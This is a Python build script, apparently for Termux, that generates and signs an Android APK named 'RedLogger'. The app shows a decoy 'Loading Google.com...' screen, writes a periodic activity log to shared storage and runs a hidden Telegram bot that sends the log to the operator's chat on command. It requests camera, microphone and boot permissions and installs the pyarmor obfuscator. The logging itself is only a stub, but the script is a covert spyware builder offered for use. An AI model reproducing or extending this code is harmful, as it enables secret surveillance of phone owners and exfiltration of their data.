import os
import subprocess
import time

def run(cmd):
    print(f"\n▶ {cmd}")
    os.system(cmd)

def install_dependencies():
    print("📦 Setting up Termux environment...")
    run("pkg update -y && pkg upgrade -y")
    run("pkg install -y python git termux-api openjdk-17 zip unzip nano apksigner")
    run("pip install --upgrade pip")
    run("pip install buildozer pyarmor python-telegram-bot==20.3 cython")
    if not os.path.exists("buildozer.spec"):
        run("buildozer init")
    print("\n✅ Environment ready.")

def create_main_py(bot_token, chat_id):
    print("🧠 Creating main.py with Telegram logger...")
    code = f"""from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.clock import Clock
from android.permissions import request_permissions, Permission
from kivy.core.window import Window
from jnius import autoclass
import time, os, threading
from telegram import Bot
from telegram.ext import ApplicationBuilder, CommandHandler

BOT_TOKEN = "{bot_token}"
CHAT_ID = {chat_id}
log_path = "/sdcard/activity_log.txt"
logging_enabled = True

def log_activity(*args):
    if not logging_enabled:
        return
    try:
        with open(log_path, "a") as f:
            f.write(f"[{{time.ctime()}}] Activity log\\n")
    except:
        pass

class WebView(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.orientation = "vertical"
        self.add_widget(Label(text="Loading Google.com..."))

class RedLoggerApp(App):
    def build(self):
        request_permissions([Permission.INTERNET, Permission.WRITE_EXTERNAL_STORAGE])
        Clock.schedule_interval(log_activity, 300)
        return WebView()

async def getlog(update, context):
    await context.bot.send_document(chat_id=CHAT_ID, document=open(log_path, "rb"))

async def clearlog(update, context):
    open(log_path, "w").close()
    await update.message.reply_text("Logs cleared.")

async def startlog(update, context):
    global logging_enabled
    logging_enabled = True
    await update.message.reply_text("Logging resumed.")

async def stoplog(update, context):
    global logging_enabled
    logging_enabled = False
    await update.message.reply_text("Logging paused.")

def start_bot():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("getlog", getlog))
    app.add_handler(CommandHandler("clearlog", clearlog))
    app.add_handler(CommandHandler("startlog", startlog))
    app.add_handler(CommandHandler("stoplog", stoplog))
    app.run_polling()

threading.Thread(target=start_bot, daemon=True).start()

if __name__ == "__main__":
    RedLoggerApp().run()
"""
    with open("main.py", "w") as f:
        f.write(code)
    print("✅ main.py created.")

def update_buildozer_spec():
    print("🛠️ Updating buildozer.spec for Android...")
    if not os.path.exists("buildozer.spec"):
        os.system("buildozer init")
    with open("buildozer.spec", "r") as f:
        lines = f.readlines()
    new_lines = []
    for line in lines:
        if line.startswith("title ="):
            new_lines.append("title = RedLogger\n")
        elif line.startswith("package.name ="):
            new_lines.append("package.name = redlogger\n")
        elif line.startswith("package.domain ="):
            new_lines.append("package.domain = org.redlogger\n")
        elif line.startswith("source.include_exts ="):
            new_lines.append("source.include_exts = py,png,jpg,kv,atlas\n")
        elif line.startswith("android.permissions ="):
            new_lines.append("android.permissions = INTERNET,WRITE_EXTERNAL_STORAGE,RECEIVE_BOOT_COMPLETED,FOREGROUND_SERVICE,CAMERA,RECORD_AUDIO\n")
        elif line.startswith("android.minapi ="):
            new_lines.append("android.minapi = 21\n")
        elif line.startswith("android.api ="):
            new_lines.append("android.api = 31\n")
        elif line.startswith("android.sdk ="):
            new_lines.append("android.sdk = 24\n")
        elif line.startswith("android.ndk ="):
            new_lines.append("android.ndk = 23b\n")
        elif line.startswith("requirements ="):
            new_lines.append("requirements = python3,kivy,python-telegram-bot\n")
        elif line.startswith("android.entrypoint ="):
            new_lines.append("android.entrypoint = org.kivy.android.PythonActivity\n")
        elif line.startswith("android.debug ="):
            new_lines.append("android.debug = 1\n")
        else:
            new_lines.append(line)
    with open("buildozer.spec", "w") as f:
        f.writelines(new_lines)
    print("✅ buildozer.spec updated.")

def generate_keystore():
    if not os.path.exists("redlogger.keystore"):
        print("🔐 Generating keystore...")
        cmd = (
            "keytool -genkey -v -keystore redlogger.keystore "
            "-alias redlogger -keyalg RSA -keysize 2048 "
            "-validity 10000 -storepass redlogpass -keypass redlogpass "
            "-dname 'CN=RedLogger, OU=AI, O=RedTeam, L=Algiers, S=DZ, C=DZ'"
        )
        os.system(cmd)
        print("✅ Keystore created.")
    else:
        print("✅ Keystore already exists.")

def build_and_sign_apk():
    print("📦 Building APK (this may take several minutes)...")
    os.system("buildozer android release")
    apk_path = "bin/redlogger-0.1-release-unsigned.apk"
    signed_apk_path = "RedLogger-signed.apk"
    if not os.path.exists(apk_path):
        print("❌ Build failed or APK not found.")
        return
    print("🔐 Signing APK with apksigner...")
    cmd = (
        f"apksigner sign --ks redlogger.keystore --ks-key-alias redlogger "
        f"--ks-pass pass:redlogpass --key-pass pass:redlogpass "
        f"--out {signed_apk_path} {apk_path}"
    )
    os.system(cmd)
    print(f"✅ Signed APK created: {signed_apk_path}")

if __name__ == "__main__":
    install_dependencies()
    print("\n🔐 Enter your Telegram Bot Token:")
    bot_token = input("> ").strip()
    print("👤 Enter your Telegram Chat ID:")
    chat_id = input("> ").strip()
    create_main_py(bot_token, chat_id)
    update_buildozer_spec()
    generate_keystore()
    build_and_sign_apk()
    print("\n🎉 All Done! Send RedLogger-signed.apk to your phone.")
